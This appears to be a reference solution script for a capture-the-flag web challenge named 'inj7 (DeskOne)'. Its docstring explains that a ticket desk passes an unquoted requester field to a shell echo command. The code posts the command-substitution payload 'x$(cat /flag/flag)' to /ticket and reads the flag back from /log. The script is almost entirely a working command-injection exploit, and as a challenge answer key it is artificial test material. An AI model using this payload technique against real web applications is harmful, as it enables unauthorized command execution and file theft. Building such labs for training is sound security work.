#!/usr/bin/env python3
"""Reference solve for inj7 (DeskOne).

The desk appends the log line through a shell:
    echo <line> >> /tmp/tickets.log
with the requester interpolated unquoted. The sanitizer strips ; | &, so
command substitution is the door:

    requester = "x$(cat /flag/flag)"

The flag is NOT in the /ticket response — it is written into the log and
read back from the /log page.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8046")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PAYLOAD = "x$(cat /flag/flag)"


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        requests.post(BASE + "/ticket",
                      data={"requester": PAYLOAD, "prio": "low"}, timeout=15)
        r = requests.get(BASE + "/log", timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found in desk log (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
